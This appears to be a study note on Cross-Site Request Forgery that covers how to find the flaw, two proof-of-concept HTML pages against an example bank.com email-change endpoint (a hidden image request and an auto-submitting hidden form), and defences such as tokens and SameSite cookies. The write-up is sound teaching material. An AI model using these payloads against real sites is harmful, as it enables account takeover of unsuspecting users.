# Cross-Site Request Forgery (CSRF)
---

## What is CSRF?

CSRF is an attack where the attacker causes the victim user to carry out an action unintentionally while that user is authenticated.

### CSRF Conditions

To successfully exploit a CSRF vulnerability, the following conditions must be true:

* Relevant Action
* Cookie-Based Session Handling
* No Unpredictable Parameters

### Impact of CSRF Attacks
* Depends on the functionality in the application that is being exploited
  * Confidentiality – it can be None / Partial (Low) / High
  * Integrity – usually either Partial or High
  * Availability – can be None / Partial (Low) / High
* Remote code execution on the server

---

## How to Find CSRF Vulnerabilities

### Black-Box Testing Perspective

* Map the application
  * Review all the key functionality in the application
* Identify all application functions that satisfy the
following three conditions
  * A relevant action
  * Cookie-based session handling
  * No unpredictable request parameters
* Create a PoC script to exploit CSRF
  * GET request: `<img>` tag with `src` attribute set to vulnerable
URL
  * POST request: form with hidden fields for all the required
parameters and the target set to vulnerable URL

### White-Box Testing Perspective

* Identify the framework that is being used by the
application
* Find out how this framework defends against
CSRF attacks
* Review code to ensure that the built in defenses
have not been disabled
* Review all sensitive functionality to ensure that
the CSRF defense has been applied

---

## How to Exploit CSRF Vulnerabilities

### Exploiting CSRF - GET Scenario

#### Example Request
`GET https://bank.com/email/change?email=test@test.ca HTTP/1.1`


#### Exploit Example
```html
<html>
<body>
<h1>Hello World!</h1>
<img src="
https://bank.com/email/change?email=at
tacker@gmail.ca
" width="0" height="0" border="0">
</body>
</html>
```

### Exploiting CSRF - POST Scenario

#### Example Request

```html
POST /email/change HTTP/1.1
Host: https://bank.com
…
email=test@test.ca
```

### Exploit Example
```html
<html>
  <body>
    <h1>Hello World!</h1>
    <iframe style="display:none" name="csrf-iframe"></iframe>
    <form action="https://bank.com/email/change/" method="POST" target="csrf-iframe" id="csrf-form">
      <input type="hidden" name="email" value="test@test.ca" />
    </form>
    <script>
      document.getElementById("csrf-form").submit();
    </script>
  </body>
</html>
```

---

## How to Prevent CSRF Vulnerabilities

* Primary Defense
  * Use a CSRF token in relevant requests.
* Additional Defense
  * Use of SameSite cookies
* Inadequate Defense
  * Use of Referer header

### Primary Defense: CSRF Tokens

#### How should CSRF tokens be generated?
* Unpredictable with high entropy, similar to session tokens
* Tied to the user's session
* Validated before the relevant action is executed

#### How should CSRF tokens be transmitted?
* Hidden field of an HTML form that is submitted using a POST method
* Custom request header
* Tokens submitted in the URL query string are less secure
* Tokens generally should not be transmitted within cookies

#### How should CSRF tokens be validated?
* Generated tokens should be stored server-side within the user’s session data
* When performing a request, a validation should be performed that verifies that the submitted token matches the value that is
stored in the user’s session
* Validation should be performed regardless of HTTP method or content type of the request
* If a token is not submitted, the request should be rejected

### Additional Defense: SameSite Cookies

The `SameSite` attribute can control whether cookies are submitted in cross-site requests.

#### Examples
```xml
Set-Cookie: session=test; SameSite=Strict
Set-Cookie: session=test; SameSite=Lax
Set-Cookie: flavor=choco; SameSite=None; Secure
```

### Inadequate Defense: Referer Header

* The Referer HTTP request header contains an absolute or partial address of
the page making the request.
  * Referer headers can be spoofed
  * The defense can usually be bypassed:
    * Example #1 – if it’s not present, the application does not check for it
    * Example #2 – the referrer header is only checked to see if it contains the domain and exact
match is not made.

---

## Resources

- [Web Security Academy - CSRF](https://portswigger.net/web-security/csrf)
- [OWASP - CSRF](https://owasp.org/www-community/attacks/csrf)
- [Cross-Site Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [OWASP Code Review Guide - Reviewing Code for CSRF Issues](https://owasp.org/www-project-code-review-guide/reviewing-code-for-csrf-issues)

